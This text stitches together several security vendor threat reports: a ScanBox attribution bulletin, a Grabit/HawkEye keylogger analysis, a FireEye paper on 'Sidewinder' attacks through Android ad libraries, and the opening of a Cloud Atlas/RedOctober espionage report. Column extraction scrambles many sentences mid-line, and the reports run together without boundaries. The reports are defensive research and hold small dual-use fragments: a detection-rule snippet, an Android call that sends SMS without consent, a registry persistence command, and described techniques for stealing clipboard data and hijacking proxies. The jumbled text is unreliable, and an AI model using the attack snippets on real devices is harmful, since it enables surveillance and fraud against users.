The screenshot on the left is from a version currently in development by a possible attacker, the
corresponding screenshot on the right is from a public article15.15 http://www.cnxhacker.com/2015/01/19/6412.html

Cyber Threat Operations

Tactical Intelligence Bulletin – TLP:WHITE

4.Conclusion
The publication of threat information allows us to draw links between different campaigns, tools and
malware but we need to be careful about which links we consider to be significant and ensure we’re
confident in how information that’s publically available was derived.The summary above is just our view
of the overlaps in web based tools/exploits and targets between different threat actors, but those with
different datasets may be able to draw different conclusions.Last time, we identified three possible hypotheses to explain the overlap between the ScanBox users, in
this blog, based on the data we have available, we can settle on just one of these conclusions:

“

2.Selections of actors share some resources, as per previous observations with similar kits by

some security vendors.”

Specifically, our key conclusions are:







[High Confidence] - The DQM theory presented by FireEye and later explored by Symantec in
2014 about likely tool and exploit sharing between a specific set of groups continues to hold true,
we can only speculate as to the nature of the relationships organisationally between these groups.[Medium Confidence] - We currently believe that the activity represented by Cluster 1 and the
activity related to Th3Bug are distinct, but that there is overlap in who they are tasked to target.[Low confidence] – Th3Bug is one of the other actors who is in receipt of the same shared
resource pool as those clusters already identified in this blog.What is not clear is why specific resources (web-based exploits) appear to be shared, and why others
(primarily malware families) are sometimes kept within a specific cluster.Cyber Threat Operations

Tactical Intelligence Bulletin – TLP:WHITE

5.'x-': a) + Math.floor(Math.random() *
99999)\;)"; flow:established,from_server; file_data; content:"return ((!a) ?Appendices
Appendix A – ScanBox Sites

Where the site was referenced via phishing as opposed to ‘Watering Hole’ based activity, it has been
excluded from the following table.Where we have an assigned cluster, but have not discussed it in this document, we have given ‘Cluster
[Letter]’ these are not intended as names for groups.Where we do not have an associated group we have
listed ‘unknown’ under this field.The information contained in this document has been prepared as a matter of interest and for
information purposes only, and does not constitute professional advice.You should not act upon the
information contained in this email without obtaining specific professional advice.No representation or
warranty (express or implied) is given as to the accuracy or completeness of the information contained
in this email, and, to the extent permitted by law, PricewaterhouseCoopers LLP, its members, employees
and agents do not accept or assume any liability, responsibility or duty of care for any consequences of
you or anyone else acting, or refraining to act, in reliance on the information contained in this email or
for any decision based on it.Cyber Threat OperationsGrabit and the RATs

Not so long ago, Kaspersky clients in the United States approached Kaspersky researchers with a request
to investigate a new type of malicious software that they were able to recover from their organizations’
servers.The malware calls itself Grabit and is distinctive because of its versatile behavior.Every sample
we found was different in size and activity from the others but the internal name and other identifiers
were disturbingly similar.The timestamp seems valid and close to the documented infection timeline.Our
documentation points to a campaign that started somewhere in late February 2015 and ended in mid-
March.As the development phase supposedly ended, malware started spreading from India, the United
States and Israel to other countries around the globe.All of the dozens of samples we managed to collect were programmed in Windows machine 32bit
processor, over the Microsoft .NET Framework (Visual Basic/C#).Files were compiled over the course of
three days, between March 7th and 9th of 2015.The following chart illustrates how the group or individual
created the samples, the size of each sample, the time of the day when each was compiled and the time
lapses between each compilation.Malware compilation timeline

The smallest sample (0.52Mb) and the largest (1.57Mb) were both created on the same day, which could
indicate experiments made by the group to test features, packers and “dead code” implementations.Looking at the chart, it is interesting to see the modus operandi as the threat actor consistently strives to
achieve a variety of samples, different code sizes and supposedly more complicated obfuscation.Along with these different sizes, activities and obfuscation, a serious encryption algorithm was also
implemented in each one of them.The proprietary obfuscated string, methods and classes made it rather
challenging to analyze.ASLR is also enabled, which might point to an open source RAT or even a
commercial framework that packed the malicious software in a well written structure.This type of work is
known as a mitigation factor for threat actors to keep their code hidden from analysts’ eyes.During our research, dynamic analysis showed that the malicious software’s “call home” functionality
communicates over obvious channels and does not go the extra mile to hide its activity.In addition, the
files themselves were not programmed to make any kind of registry maneuvers that would hide them from
Windows Explorer.Taking that into an equation, it seems that the threat actors are sending a “weak
knight in a heavy armor” to war.It means that whoever programmed the malware did not write all the
code from scratch.A well trained knight would never go to war with a blazing shield and yet a stick for a
sword.Looking into the “call home” traffic, the Keylogger functionality prepares files that act as a container for
keyboard interrupts, collecting hostnames, application names, usernames and passwords.However, the
interesting part lies here.The file names contain a very informative string:

HawkEye_Keylogger_Execution_Confirmed_<VICTIM> 3.10.2015 6:08:31 PM

HawkEye is a commercial tool that has been in development for a few years now; it appeared in 2014, as
a website called HawkEyeProducts, and made a very famous contribution to the hacker community.In the website, the product shows great versatility as it contains many types of RATs, features and
functionality, such as the traditional HawkEye Logger or other types of remote administration tools like
Cyborg Logger, CyberGate, DarkComet, NanoCore and more.It seems to support three types of delivery:
FTP, SMTP and Web-Panel.As seen, the malware uses a number of RATs to control its victims or track their activity.One of the threat
actor’s successful implementations contained the well-known DarkComet.This convenient “choose your

RAT” functionality plays a very important role in the malware infection, routine and survival on the
victim’s machine.The DarkComet samples are more complicated than the traditional HawkEye logger.One instance had a random key generator which sets an initialization vector of the first 4 bytes of the
executable file and appends a random 5 byte key that unpacks another PE file, less than 20Kb in size.The
PE file then contains another packer with an even more challenging obfuscation technique.The last
sample we tested had still more complicated behavior.The code itself had the same obfuscation technique,
though traffic was not transferring in clear text.Stolen data was packed and sent encrypted over HTTP
random ports.This means that the group is trying to produce other types of malicious samples with
different RATs.Approximately 10,000 stolen files have been collected.Companies based in Thailand and India had the
largest percentage of infected machines.By looking at the stolen credentials, it is very clear that employees
sent the malware to one another, as stolen host names and internal applications are the same.The following is the full chart, updated to May 2015:

Malware distribution by country

Demonstrating the effectiveness of their simple Keyloggers, one C2 (on May 15th) maintained thousands
of victim account credentials from hundreds of infected systems.To sum it up, Grabit threat actors did not use any sophisticated evasions or maneuvers in their dynamic
activity.It is interesting to see the major differences between the core development of the malware and the
actual functionality it uses.Some malware samples used the same hosting server, and even the same credentials.Could it be that our

threat actor was in a hurry?Our guess is that we are looking at a group and not an individual.Some
members of the group are more technical than the others and some are more security oriented and aware
of the risks they might expose themselves to.Back to square one:

From what we have seen so far, the malware is being delivered as a Microsoft Office Word (.doc) email
attachment, containing a malicious macro called AutoOpen.This macro simply opens a socket over TCP
and sends an HTTP request to a remote server that was hacked by the group to serve as a malware hub,
before downloading the malware.In some cases the malicious macro was password protected, but our
threat actor might have forgotten that a .doc file is actually an archive and when that archive is opened in a
convenient editor of your choice, the macro strings are shown in clear-text.The malware is in plain view, modifying commonplace registry entries, such as the startup configurations,
and not covering its tracks.Its binaries are not deleted in most cases, and its communication is in clear-
text, where the victim can sniff the communication and grab the FTP/SMTP server’s credentials.We hope this paper
                              devices has reached 1.9 billion1.At the same                                    kickstarts the conversation on how to better
                              time, enterprises are also embracing Android-                                    protect the security and privacy in third-party
                              based Bring Your Own Device (BYOD) solutions.libraries and how to further harden the Android
                              For example, in Intel’s BYOD program, there are                                  security framework in the future.more than 20,000 Android devices across over
                              800 combinations of Android versions and
                              hardware configurations2.Sidewinder Targeted Attack Overview
                              Although little malware has been found in Google                                 To understand the security risks brought by a
                              Play, both Android apps and the Android system                                   Sidewinder Targeted Attack, we first explain one
                              itself contain vulnerabilities.Aggressive ad                                    possible attack mechanism (illustrated in Figure 1)
                              libraries also leak the user’s private information.that is similar to that of Sidewinder missiles.The
                              By leveraging all these vulnerabilities, an attacker                             attacker can hijack the network where the
                              can conduct more targeted attacks, which we call                                 targeted victim resides.Like an infrared homing
                              “Sidewinder Targeted Attacks.” In this paper we                                  system, the attacker then seeks “emission” from ad
                              explain the security risks from such attacks, in                                 libraries running on the target device to track and
                              which an attacker can intercept and use private                                  lock on it.Once the target is locked on, the
                              information uploaded from ad libraries to                                        attacker can launch advanced persistent attacks.precisely locate targeted areas such as a CEO’s                                  To minimize detection chances, the attacker can
                              office or specific conference rooms.When the                                    choose to take action on important targets only,
                              target is identified, a “Sidewinder Targeted Attack”                             ignoring all other devices.In later sections, we
                              exploits popular vulnerabilities in ad libraries, such                           discuss attacking (“warhead”) and targeting
                              as Javascript-binding-over-HTTP or dynamic-                                      (“homing”) components in detail and show how a
                              loading-over-HTTP, etc.combination of these components can launch
                                                                                                               powerful and precise attacks on target devices.It is a well-known challenge for an attacker to call
                              Android services from injected native code that                                  Table 1 proposes different attacks that an
                              doesn’t have Android application context.Here,                                  attacker can launch remotely on target devices
                              we explain how attackers can invoke Android                                      through vulnerable ad libraries.Figure 2 shows a
                              services for tasks including taking photos, calling                              proof-of-concept attack control interface.This
                              phone numbers, sending SMS, reading from/                                        attack targets one of the ad libraries described in
                              writing to the clipboard, etc.Furthermore, the                                  this paper.The security risks become obvious by
                              attackers can exploit several Android                                            looking at what the attacker can do with this
                              vulnerabilities to get valuable private information                              control interface.The left panel enables the
                              or to launch more advanced attacks.attacker to command the victim's device,




                              1
                               	 Ranjit Atwal, Lillian Tay, Roberta Cozza, Tuong Huy Nguyen, Tracy Tsai, Annette Zimmermann, and CK Lu.Forecast: Pcs, ultramobiles and mobile phones,
                                 worldwide, 2010-2017, 4q13 update.Gartner, 2013.2
                               	 Rob Evered, Steve Watson, Paul Dockter, and Derek Harkin.Android devices in a byod environment.Intel White Paper, 2013.The panel also
                              apps uploaded to Google Play, etc.The right                      pins down the GPS location of the victim’s
                              panel lists all information stolen from the                       device onto a Google Map widget.victim’s device.Figure 2: The
     control panel of
     the attacker, and
     the files uploaded
     from the victim




                              Warhead: Attacking Vulnerabilities                                             (Android 4.1) or below.However, it is widely known that this                                 malicious content into the WebView and to
                              feature, if not used carefully, presents a potential                           control the host application.Listing 1 is a sample
                              security risk when running on Android API 16                                   Javascript snippet to execute shell command.3
                               	 http://developer.android.com/reference/android/webkit/WebView.html# addJavascriptInterface(java.lang.Object,%20java.lang.String).This applies to insecure                                  Binding Interfaces
                              HTTPS channels as well.Based on the official                                 a WebView.However, if an ad library uses the
                              data in June 20145, ~60% of Android devices are                                  @JavascriptInterface annotation to expose
                              still running API≤16.security-sensitive interfaces, and uses HTTP to
                                                                                                               load content in the WebView, it is vulnerable to
                              Note that API>16 platforms are not necessarily                                   attacks where an attacker over the network
                              secure.If the app is targeting at a lower API                                   could inject malicious content into the WebView
                              level, Android will still run it with the lower API                              to misuse the interfaces exposed through the JS
                              level for compatibility reasons.Figure 3 shows                                  binding annotation.We call these exposed JS
                              the targeted API of popular Google Play apps,                                    binding annotation interfaces “JS Sidedoors.”
                              each of which has over 50,000 downloads.We
                              can see that a large portion of apps are                                         For example, we found a list of sensitive
                              targeting at API≤16.Javascript interfaces that are publicly ex- posed
                                                                                                               from certain versions of a real-world ad library:


                              4
                               	 http://www.fireeye.com/blog/technical/2014/01/js-binding-over-http- vulnerability-and-javascript-sidedoor.html.5
                               	https://developer.android.com/about/dashboards/index.html.6
                               	 http://developer.android.com/reference/android/webkit/ JavascriptInterface.html.6 www.fireeye.com
FireEye: Sidewinder Targeted Attack against Android




                              createCalendarEvent, makeCall,                                           functionalities, especially remote call invocations,
                              postToSocial, sendMail, sendSMS,                                         are encapsulated in the context.We discuss
                              takeCameraPicture, getGalleryImage,                                      attacks requiring context in a later section.In this
                              registerMicListener, etc4.Given that this ad                            section, we explain attacks that don’t need
                              library loads ads using HTTP, if the host app has                        Android context, and discuss their security risks.and use them to root the device.Commercial
                                                                                                       one-touch root apps claim they can root more
                              Security Issues with DEX Loading over                                    than 1,000 brands (>20,000 models) 8.HTTP (DLOH)                                                              towelroot 9, which exploits a bug found
                              Similar to JBOH, DEX loading over HTTP or                                recently in Linux kernel, claims that it can root
                              insecure HTTPS (DLOH) is another serious issue                           most new devices released before June 2014.
                              raised by ad libraries.If the attackers can hijack                      Thus, as long as attackers can get the JBOH shell,
                              the communication channels and inject malicious                          they have the tools to obtain root on most
                              DEX files, they can then control the behaviors of                        Android phone models.the victim apps.Even if the attackers can’t obtain root, they can
                              Detonation without Android Context                                       attempt ptrace 10 to control the host app.After getting local access, the attacker can upload                      Although only processes with root privilege can
                              private and sensitive files from the victim’s device,                    ptrace others, child processes are able to
                              or modify files that the host app can write to (e.g.,                    ptrace their parents.Because the shell
                              the directory of the host app and SD Card with                           launched from the Javascript bridge is a child
                              FAT file system).process of the host app, it can ptrace the host
                                                                                                       app’s process.Note that only apps with
                              To launch more sophisticated attacks like sending                        android:debuggable set as “true” in the manifest
                              SMS or taking pictures, the attackers may use                            can be ptraced, which limits its adoption.Java reflection to call other APIs from the
                              Javascript bridge.It appears this method makes                          Sending SMS and Dialing Numbers without
                              sending SMS easy.However, some other                                    User Consent
                              operations require Android context 7 or                                  Sending SMS does not require context or user
                              registering Java callbacks.Android context                              interaction.A simple call does the job, as
                              provides an interface to the global information                          shown in Listing 2
                              about an app’s environment.Many Android



     Listing 2: Sending
     SMS without user             SmsManager.getDefault().sendTextMessage(phoneNumber,null,message,null,null);
     consent




                              7
                               	http://developer.android.com/reference/android/content/Context.html.8
                               	http://shuaji.360.cn/root/.9
                               	http://towelroot.com/.10
                                	http://linux.die.net/man/2/ptrace.7 www.fireeye.com
FireEye: Sidewinder Targeted Attack against Android




                              To make calls from the Javascript bridge                                       Javascript bridge.Code in Listing 4, for
                              without user consent, we can invoke the                                        example, is an easy way to get context from
                              telephony service to dial numbers directly via                                 anywhere of the application.binder, as shown in Listing 3, where phone is
                              the remote Android telephony service and the                                   Operations like taking pictures and recording
                              number 2 represents the second remote call.videos need to register Java callbacks.The
                              s16 is the type marker represents “16 bit                                      attackers either need to boot a Java VM from
                              string,” and packageName is the host app’s                                     the Javascript bridge, or to inject code into
                              package name, where we can obtain from the                                     the host app’s Java VM.information posted from the ad libraries.The
                              sequence number of the remote calls can be                                     Fortunately, Android Runtime offers another
                              found in the corresponding Android Interface                                   way to load Java Native Interface (JNI) code
                                                                                                             into the host app using Runtime.load().As
                              Definition Language (AIDL) files 11.Many other                                shown in Listing 5, an attacker can load
                              Android services can be invoked in the same                                    executables compiled from JNI code.11

                               	http://developer.android.com/reference/dalvik/system/DexClassLoader.html.12




8 www.fireeye.com
FireEye: Sidewinder Targeted Attack against Android




                              There are other ways to obtain Android context,                               Using these APIs, the attackers can monitor
                              like reflecting to the private static context                                 changes to a clipboard and transfer the
                              variable of WebView13.However, without Java                                  clipboard contents to some remote server.VM instances, it’s difficult to take pictures and                             They can also alter the clipboard content to
                              record videos.After our submission to Black Hat                              achieve phishing goals.For example, the user
                              in April 2014, we noticed that MWR was also                                   may copy a link to visit and the background
                              concurrently and independently working on this                                malicious service can change that link to a
                              issue.They published a similar mechanism in                                  phishing site.We have notified Google about
                              June 201414.                                                                  this issue.Clipboard Monitoring nd Tampering                                             Launcher Settings Modification
                              With the Android context, an attacker can                                     Android Open Source Project (AOSP) classifies
                              monitor or tamper with the clipboard.Android                                 Android permissions into several protec- tion
                              users may perform copy-paste on important text                                levels: “normal,””dangerous,” “system,”
                              content.For example, there are many popular                                  “signature” and “development”15,16,17.Malicious                                    some other approach may be taken to avoid
                              apps can steal the passwords if they can read                                 the user automatically allowing the use of such
                              the contents on clipboard.Android has no                                     facilities.”In contrast, normal permissions are
                              permissions restricting apps from accessing                                   automatically granted at installation, “without
                              the global clipboard.Any UID has the capability                              asking for the user’s explicit approval (though
                              to manipulate clipboard via the API calls in Listing 6:                       the user always has the option to review these




                              13
                                	 http://www.weibo.com/p/1001603724694418249344?utm_source=weibolife.14
                                	https://labs.mwrinfosecurity.com/blog/2014/06/12/putting-javascript- bridges-into-android-context.15
                                	 http://developer.android.com/guide/topics/manifest/permission-element.html.16
                                	 https://android.googlesource.com/platform/frameworks/base/+/master/ core/res/AndroidManifest.xml.17
                                	https://android.googlesource.com/platform/packages/apps/Launcher2/+/ master/AndroidManifest.xml.9 www.fireeye.com
FireEye: Sidewinder Targeted Attack against Android




                              permissions before installing)”15.If an app requests                         corresponding field.Note that the
                              both dangerous permissions and normal                                         proxySettings field is a private Java field not
                              permissions, Android only displays the dangerous                              intended to be accessed by other processes.per- missions by default.If an app requests only                             Unfortunately, the flexible and powerful Java
                              normal permissions, Android doesn’t display any                               reflection mechanism (especially the forName(),
                              permission to the user.getField(), setAccessible() calls) exposes
                                                                                                            such components to the attackers for arbitrary
                              We have found that certain “normal” permissions                               read or write operations.have dangerous security impacts18.These two permissions                                   APIs does not need user interaction or
                              enable an app to query, insert, delete, or modify                             consent, which makes it easy to record sound
                              all launcher configuration settings, including icon                           in the background.insertion or modification.On the contrary, taking pictures and recording
                              As a proof-of-concept attack scenario, a malicious                            videos are more challenging.First, this requires
                              app with these two permissions can query/insert/                              registering Java callbacks.Second, Android warns
                              alter the system icon settings and modify                                     that “Preview must be started before you can take
                              legitimate icons of some security- sensitive apps,                            a picture”19.It seems that taking pictures and
                              such as banking apps, to a phishing website.recording videos without user notification is
                                                                                                            impossible.However, security largely depends on
                              After our notification, Google has patched this                               the correct implementation and enforcing a
                              vulnerability in Android 4.4.3 and has released the                           flawless implementation is difficult.On some of
                              patch to its OEM partners.However, according to                              the popular phones (models anonymized for
                              Google5, by 7 July 2014, 17.9% Android devices                                security consideration), startPreview() is
                              are using Android 4.4.Given that Android 4.4.2                               required to take pictures/record videos;
                              and below has this vulnerability, over 82.1%                                  However, it’s highly possible that on these
                              Android devices are vulnerable.devices takePicture() fails to check whether a
                                                                                                            view has been presented to the user.Proxy Modification                                                            Fortunately, we have never witnessed a case
                              With the CHANGE WIFI STATE permission,                                        where the MediaRecorder can shoot videos
                              Android processes can change the proxy                                        without calling setPreviewDisplay.But we
                              settings of WIFI networks (not solely the currently                           were able to create and register a dummy
                              connected one).http://www.fireeye.com/blog/technical/2014/04/occupy_your_icons_ silently_on_android.html.18

                               	http://developer.android.com/reference/android/hardware/Camera.html.19




10 www.fireeye.com
FireEye: Sidewinder Targeted Attack against Android




                              Stealthy App Installation by Abusing                                         case with the attackers eavesdropping or hijacking
                              Credentials                                                                  the HTTP traffic.Switching to HTTPS may not
                              With both the GET ACCOUNTS and the USE                                       solve this issue since the HTTPS security relies on
                              CREDENTIALS permissions, Android pro- cesses                                 a flawless implementation, which is difficult.For
                              can get secret tokens of services (e.g., Google                              example, there are cases where the developer
                              services) from the AccountManager and use them                               failed (intentionally or unintentionally) to check
                              to authenticate to these services20.We verified                             the server’s certificate21.We found that some of
                              that Android apps with these two permissions can                             the most popular ad libraries (see Table 3) have
                              authenticate themselves with the user’s Google                               this issue.We successfully launched Man-in-the-
                              account, allowing access to Google Play and the                              Middle (MITM) attacks and intercepted the data
                              ability send app installation requests.Through the                          uploaded to the remote server.Combined                                    MITM attacks22,23.with the launcher modification attack introduced
                              earlier, the attackers can redirect other app icons                          Information Leakage from Ad Libraries
                              (e.g., bank or email app icons) to the phishing app                          Almost every ad library uploads local information
                              and steal the user’s login credentials.from Android devices.Based on our observations,
                                                                                                           they do so mostly for purposes such as checking
                              Targeting Victims Based on Ad Traffic                                        for platform compatibility and user interest
                              In this section, we explain the risks of victims’                            targeting.The information most frequently
                              devices being tracked and targeted through                                   uploaded includes IMEI, Android version,
                              ad traffic.manufacturer, Android ID, device specification,
                                                                                                           carrier information, host app information,
                              Communication Channels Prone to Hijack                                       installed app list, etc.Table 3 lists the info
                              It is well known that communication via HTTP is                              uploaded from the top five popular ad libraries.prone to hijacking and data tamper- ing.Though
                              ad libraries may not have the incentive to abuse                             Listing 7 is a captured packet posted to the
                              users’ private and sensitive data, this is not the                           remote ad server by one of the ad libraries.21
                                	Sascha Fahl, Marian Harbach, Thomas Muders, Lars Baumga¨rtner, Bernd Freisleben, and Matthew Smith.Why eve and mallory love android: An analysis
                                 of android ssl (in) security.In Proceedings of the 2012 ACM conference on Computer and communications security, pages 50–61.ACM, 2012.22
                                	 https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224.23
                                	http://www.fireeye.com/blog/technical/2014/04/if-an-android-has-a- heart-does-it-bleed.html.11 www.fireeye.com
FireEye: Sidewinder Targeted Attack against Android




                              captured from a popular Google Play app.From                                DNS hijacking is legally and maliciously used in
                              this packet we can tell the device’s screen density                          many situations including traffic management,
                              (d-device-screen-density), screen size (d-device-                            phishing and censorship.Attackers successfully
                              screen-size), host app’s pack- age name (u-appBId),                          compromised many DNS servers, including the
                              host app’s name (u-appDNM)1, host app’s version                              ones from Google and Godaddy24.By DNS
                              (u-appVer), user agent (h-user-agent), localization                          hijacking, attackers can effectively access all the
                              (d-localization), mobile network type (d-netType),                           traffic to ad servers.screen orientation (d-orientation), and GPS
                              location (u-latlong-accu).The most important                                BGP hijacking takes over groups of IP addresses,
                              infor- mation is the GPS location, where the                                 corrupting Internet routing tables by breaking
                              victim’s latitude, longitude and the location                                BGP sessions or injecting fake BGP information.precision are shown.It is reasonable for an ad to                           This enables attackers to monitor all traffic to
                              obtain this information to improve the ad-serving                            specific IPs.Historically, there were many BGP
                              experience.However, with this information, an                               hijacking attacks that affected YouTube, DNS root
                              attacker can precisely locate the victim and                                 servers, Yahoo, and many other important
                              acquire the device’s specifications.Internet services25.Large-scale Monitoring and Precise Hijacking                                 ARP hijacking (or spoofing) in IDC26 is done to
                              To locate victims effectively, an attacker needs to                          hijack the traffic to the ad server in the IDC where
                              monitor large-scale network traffic containing                               the ad server locates through fake ARP packets.such private information.Unfortunately, several                             Attackers may rent servers close to the target
                              well-known attacks can be used to achieve                                    servers, and use fake ARP packets to direct all the
                              large-scale monitoring, including DNS hijacking,                             traffic to go through the hijacking servers first for
                              BGP hijacking, and ARP hijacking in IDC.monitoring and hijacking..ARP hijacking is a
                                                                                                           well-known approach used in network attacks.In this context, DNS hijacking is done to subvert
                              the resolution of Domain Name System (DNS)                                   Using the large-scale traffic intercepted from the
                              queries through modifying the behavior of DNS                                above methods, attackers can iden- tify potential
                              servers so that they serve fake DNS information.24

                               	http://www.networkworld.com/article/2272520/lan-wan/six-worst-internet- routing-attacks.html.25

                               	http://en.wikipedia.org/wiki/ARP\_spoofing.26




12 www.fireeye.com
FireEye: Sidewinder Targeted Attack against Android




                              location described in Sec- tion 4.2.After that,        using Ad1, Ad2, ..., Ad92 to refer to them, where
                              they can inject exploits only into the targeted         the subscripts represent the rankings of how
                              traffic to launch further attacks.Attackers keep a     many apps include the ad libraries.The top five
                              low profile by allowing all other irrelevant            popular ad libraries’ inclusion and download
                              network traffic to pass without being modified.statistics are listed in Table 2.Targetable and Exploitable Google                       We analyzed the 92 ad libraries found in the
                              Play Apps                                               popular Google Play apps, and summa- rized the
                              We used the FireEye Mobile Threat Prevention            communication channel vulnerabilities in Table
                              (MTP) engine to analyze all of the ~73,000              3.Combined with the uploaded information
                              popular apps from Google Play with more than            column we can learn about the data the
                              50,000 downloads, and identified 93 ad libraries.attackers can obtain.The detailed ad library inclusion statistics are
                              shown in Figure 4.Seventy-one% of the apps             Fifty-seven of the 92 ad libraries in the popular
                              contain at least one ad library, 35% have at least      Google Play apps have the JBOH issue.two ad libraries, and 22.25% include at least           Specifically, four of the top five ad libraries are
                              three ad libraries.The largest ad inclusion            subject to this problem (shown in Table 2).Seven
                              number is 35.Since Google is cautious about the        of the 92 ad libraries are prone to DLOH attacks.security of the products it directly controls, we       Particularly, some versions of Ad5 in Table 3 have
                              exclude Google Ad from the following discussion.this problem.The affected Google Play apps
                              For security considerations, in this paper we           number and the accumulated download counts
                              anonymize the names of the other 92 ad libraries,       are listed in Table 4.Table 2: The
     inclusion statistics          Ad Library         Number of Apps      JBOH Apps          Total Downloads      JBOH Downloads
     of the top five
     Android ad
                                      Ad1                 9,702              2,802               8,781M               2,348M
     libraries excluding
     Google Ad.Their
     JBOH statistics                  Ad2                 8,856              4,204               7,865M               4,754M
     are also listed
     (discussed in
                                      Ad3                 8,818              2,117               8,499M               1,611M
     the earlier JBOH
     section.).Note that an app                 Proxy modification                644             792M            419                378M
     is counted in the total statistics if
     it is subject to any of the attacks,                  Record audio                  1,097           1,408M           654                621M

     including uploading files and root             Take pictures/record videos          1,141           1,380M           622                665M
     exploits.Install apps stealthily            351             552M            197                332M

                                                      Total(incl.root exploits)        16,579          11,706M          4,201              3,207M




14 www.fireeye.com
FireEye: Sidewinder Targeted Attack against Android




                              Conclusion
                              In the current golden age of Android ad              1.Android is a complex system.Any sub-
                              libraries, Sidewinder Targeted Attacks can               component’s vulnerability may impact the
                              target victims using info leakage and other              security of the whole system.vulnerabilities of ad libraries to get valuable,         Fragmentation makes the situation even
                              sensitive information.Millions of users are still       more challenging.under the threat of Sidewinder Targeted
                              Attacks.First we need to improve the security       2.The trade-off between usability,
                              and privacy protection of ad libraries.For              performance and security always matters,
                              example, we encourage ad libraries’ publishers           and market demand frequently dictates
                              to use HTTPS with proper SSL certificate                 that security comes last.Many Android
                                                                                       developers do not even understand how
                                                                                       to program securely (as shown in the
                                                                                       JBOH issue).Sidewinder Targeted Attacks can target
victims using info leakage and other                                               3.Many security patches are not back-ported
                                                                                       to old versions of Android (like the launcher
vulnerabilities of ad libraries to get valuable,                                       settings problem described earlier), even
sensitive information.Millions of users are                                           though older versions are widely used.still under the threat of Sidewinder                                               4.There is always information asymmetry in
Targeted Attacks.the development chain.For example, it
                                                                                       usually takes several months for vendors to
                                                                                       apply security patches after Google
                                                                                       releases them.validation, and to properly encrypt network
                              traffic.They also need to be cautious about         Albeit challenging, we hope that this work
                              which privileged interfaces are exposed to the       can kickstart a conversation, both on
                              ad providers, in case of malicious ads or            improved security and privacy protection in
                              attackers hijacking the communication channels.third-party libraries and on a hardened
                                                                                   Android security framework.Meanwhile, Google itself needs to further
                              harden the security framework.governments worldwide against the next                The core of the FireEye platform is a virtual
                                    generation of cyber attacks.These highly             execution engine, complemented by dynamic threat
                                    sophisticated cyber attacks easily circumvent         intelligence, to identify and block cyber attacks in
                                    traditional signature-based defenses, such as         real time.FireEye has over 1,900 customers across
                                    next-generation firewalls, IPS, anti-virus, and       more than 60 countries, including over 130 of the
                                    gateways.The FireEye Threat Prevention Platform      Fortune 500.FireEye, Inc. | 1440 McCarthy Blvd.Milpitas, CA 95035 | 408.321.6300 | 877.FIREEYE (347.3393) | info@fireeye.com | www.fireeye.com

© 2014 FireEye, Inc. All rights reserved.FireEye is a registered trademark of FireEye,
Inc. All other brands, products, or service names are or may be trademarks or service
marks of their respective owners.WP.SW.EN-US.072014Cloud Atlas: RedOctober APT is back in style
Two years ago, we published our research into RedOctober, a complex cyber-espionage operation
targeting diplomatic embassies worldwide.We named it RedOctober because we started this investigation
in October 2012, an unusually hot month.After our announcement in January 2013, the RedOctober operation was promptly shut down and the
network of C&Cs was dismantled.As usually happens with these big operations, considering the huge
investment and number of resources behind it, they don't just "go away" forever.Normally, the group goes
underground for a few months, redesigns the tools and the malware and resume operations.See:

       RedOctober Part 1
       RedOctober Part 2

Since January 2013, we've been on the lookout for a possible RedOctober comeback.One possible hit was
triggered when we observed Mevade, an unusual piece of malware that appeared late in 2013.The Mevade
C&C name styles as well as some other technical similarities indicated a connection to RedOctober, but the
link was weak.It wasn't until August 2014 that we observed something which made us wonder if
RedOctober is back for good.Meet Cloud Atlas

In August 2014, some of our users observed targeted attacks with a variation of CVE-2012-0158 and an
unusual set of malware.We did a quick analysis of the malware and it immediately stood out because of
certain unusual things that are not very common in the APT world.As we started digging into the operation, more details emerged
which supported this theory.Perhaps the most unusual fact was that the Microsoft Office exploit didn't directly write a Windows PE
backdoor on disk.Instead, it writes an encrypted Visual Basic Script and runs it.Cloud Atlas exploit payload - VBScript

This VBScript drops a pair of files on disk - a loader and an encrypted payload.The loader appears to be
different every time and internal strings indicate it is "polymorphically" generated.The payload is always
encrypted with a unique key, making it impossible to decrypt unless the DLL is available.We observed several different spear-phishing documents that drop uniquely named payloads.For
instance, the "qPd0aKJu.vbs" file MD5:
E211C2BAD9A83A6A4247EC3959E2A730 drops the following files:

DECF56296C50BD3AE10A49747573A346 - bicorporate - encrypted payload
D171DB37EF28F42740644F4028BCF727 - ctfmonrn.dll - loader

The VBS also adds a registry key:

HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\ setting the
key "bookstore" to the value "regsvr32 %path%\ctfmonrn.dll /s", which ensures the malware runs every
time at system boot.C&C communication

The Cloud Atlas implants utilize a rather unusual C&C mechanism.All the malware samples we've seen
communicate via HTTPS and WebDav with the same server "cloudme.com", a cloud services provider.According to their website, CloudMe is owned and operated by CloudMe AB, a company based in
Linköping, Sweden.(Important note: we do not believe that CloudMe is in any way related to the Cloud Atlas group - the
attackers simply create free accounts on this provider and abuse them for command-and-control).Each malware set we have observed so far communicates with a different CloudMe account though.The
attackers upload data to the account, which is downloaded by the implant, decrypted and interpreted.In
turn, the malware uploads the replies back to the server via the same mechanism.Of course, it should be
possible to reconfigure the malware to use any Cloud-based storage service that supports WebDAV.Here's a look at one such account from CloudMe:




The data from the account:
The files stored in the randomly named folder were uploaded by the malware and contain various things,
such as system information, running processes and current username.The data is compressed with LZMA
and encrypted with AES, however, the keys are stored in the malware body which makes it possible to
decrypt the information from the C&C.We previously observed only one other group using a similar method – ItaDuke – that connected to
accounts on the cloud provider mydrive.ch.Victim statistics: top 5 infected countries

Similarities with RedOctober

Just like with RedOctober, the top target of Cloud Atlas is Russia, followed closely by Kazakhstan,
according to data from the Kaspersky Security Network (KSN).Actually, we see an obvious overlap of
targets between the two, with subtle differences which closely account for the geopolitical
changes in the region that happened during the last two years.Interestingly, some of the spear-phishing documents between Cloud Atlas and RedOctober seem to exploit
the same theme and were used to target the same entity at different times.Both Cloud Atlas and RedOctober malware implants rely on a similar construct, with a loader and the final
payload that is stored encrypted and compressed in an external file.There are some important differences
though, especially in the encryption algorithms used – RC4 in RedOctober vs AES in Cloud Atlas.The usage of the compression algorithms in Cloud Altas and RedOctober is another interesting similarity.Both malicious programs share the code for LZMA compression algorithm.In CloudAtlas it is used to
compress the logs and to decompress the decrypted payload from the C&C servers, while in Red October
the "scheduler" plugin uses it to decompress executable payloads from the C&C.It turns out that the implementation of the algorithm is identical in both malicious modules, however the
way it is invoked is a bit different, with additional input sanity checks added to the CloudAtlas version.Another interesting similarity between the malware families is the configuration of the build system used
to compile the binaries.Every binary created using the Microsoft Visual Studio toolchain has a special
header that contains information about the number of input object files and version information of the
compilers used to create them, the "Rich" header called so by the magic string that is used to identify it in
